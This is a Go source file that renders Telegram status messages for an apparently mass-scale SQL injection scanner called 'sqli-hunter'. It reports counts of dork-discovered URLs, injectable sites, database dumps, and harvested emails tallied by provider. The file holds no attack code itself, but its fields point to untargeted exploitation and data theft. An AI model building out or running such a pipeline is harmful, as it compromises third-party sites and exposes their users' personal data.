package alert

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

const (
	MaxBoardVulns  = 10
	MaxBoardEmails = 8
	MaxBoardURLs   = 8
)

// BoardState état affiché dans le message live Telegram.
type BoardState struct {
	Phase string // discover, fresh-pass, scan, done, stopped, no-new, error

	DiscoverLabel string
	DorkStep      int
	DorkTotal     int
	Kept          int
	Fetched       int
	Skipped       int
	DiscoverDone  bool

	Scanned   int
	ScanTotal int
	Vulns     int
	Findings  int
	DumpsOK   int
	DumpFails int
	NewEmails int
	ScanDone  bool
	Stock     string
	Detail    string

	URLsList   []string
	VulnsList  []models.Finding
	EmailsList []string
	Error      string
}

// RenderBoard formate le message live complet (rétrocompat tests).
func RenderBoard(loc string, st BoardState) string {
	if st.Phase == "scan" || st.Phase == "done" || st.Phase == "stopped" || st.ScanDone {
		return RenderScanBoard(loc, st)
	}
	return RenderDiscoverBoard(loc, st)
}

// RenderDiscoverBoard — stats discover (legacy).
func RenderDiscoverBoard(loc string, st BoardState) string {
	if st.Error != "" {
		return "❌ " + st.Error
	}
	if st.DiscoverDone || st.Phase == "scan" || st.Phase == "done" {
		if st.DorkTotal > 0 {
			return fmt.Sprintf("🔍 %d/%d · 📌 %d URLs", max(st.DorkStep, st.DorkTotal), st.DorkTotal, st.Kept)
		}
		return fmt.Sprintf("🔍 📌 %d URLs", st.Kept)
	}
	if st.DorkTotal > 0 {
		line := fmt.Sprintf("🔍 %s %d/%d", progressBar(st.DorkStep, st.DorkTotal), st.DorkStep, st.DorkTotal)
		if st.Kept > 0 || st.Fetched > 0 {
			line += fmt.Sprintf(" · 📌 %d", st.Kept)
		}
		return line
	}
	return "🔍 …"
}

// RenderScanBoard — stats scan uniquement (1 message live édité).
func RenderScanBoard(loc string, st BoardState) string {
	if st.Error != "" {
		return "❌ " + st.Error
	}

	switch st.Phase {
	case "stopped":
		return scanStatsLine(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK, "⏹")
	case "done", "no-new":
		var b strings.Builder
		b.WriteString("✅ ")
		b.WriteString(scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
		if st.NewEmails > 0 {
			b.WriteString(fmt.Sprintf(" · 📬 +%d", st.NewEmails))
		}
		if compact := compactStock(st.Stock); compact != "" {
			b.WriteString("\n📦 ")
			b.WriteString(compact)
		}
		return b.String()
	}

	if st.ScanTotal > 0 {
		return fmt.Sprintf("🛡 %s %s", progressBar(st.Scanned, st.ScanTotal), scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
	}
	return fmt.Sprintf("🛡 %s", scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
}

func scanStatsLine(scanned, total, vulns, findings, dumps int, prefix string) string {
	return prefix + " " + scanStatsCore(scanned, total, vulns, findings, dumps)
}

func scanStatsCore(scanned, total, vulns, findings, dumps int) string {
	if total > 0 {
		return fmt.Sprintf("%d/%d · 🔴 %d · 🔎 %d · 💾 %d", scanned, total, vulns, findings, dumps)
	}
	return fmt.Sprintf("🔴 %d · 🔎 %d · 💾 %d", vulns, findings, dumps)
}

func compactStock(stock string) string {
	stock = strings.TrimSpace(stock)
	if stock == "" {
		return ""
	}
	lines := strings.Split(stock, "\n")
	if len(lines) == 0 {
		return ""
	}
	// "stock emails:\n• gmail.com — 12" → "gmail 12 · bluewin 5"
	var parts []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasSuffix(line, ":") || strings.Contains(line, "vide") || strings.Contains(line, "empty") {
			continue
		}
		line = strings.TrimPrefix(line, "• ")
		line = strings.TrimPrefix(line, "- ")
		line = strings.ReplaceAll(line, " — ", " ")
		parts = append(parts, line)
	}
	return strings.Join(parts, " · ")
}

func progressBar(step, total int) string {
	const width = 10
	if step <= 0 {
		return strings.Repeat("░", width)
	}
	filled := width
	if total > 0 {
		filled = step * width / total
		if filled > width {
			filled = width
		}
		if filled < 1 && step > 0 {
			filled = 1
		}
	}
	return strings.Repeat("█", filled) + strings.Repeat("░", width-filled)
}

func shortVulnLine(f models.Finding) string {
	u := compactURL(f.URL, 52)
	if f.Parameter != "" {
		return fmt.Sprintf("%s · ?%s", u, f.Parameter)
	}
	return u
}

func compactURL(u string, max int) string {
	u = strings.TrimSpace(u)
	u = strings.TrimPrefix(u, "https://")
	u = strings.TrimPrefix(u, "http://")
	return truncURL(u, max)
}

func vulnEmoji(t models.VulnType) string {
	switch t {
	case models.SQLiError:
		return "💥"
	case models.SQLiUnion:
		return "🔗"
	case models.SQLiBoolean:
		return "🎭"
	case models.SQLiTime:
		return "⏱️"
	case models.NoSQL:
		return "🍃"
	default:
		return "🔴"
	}
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
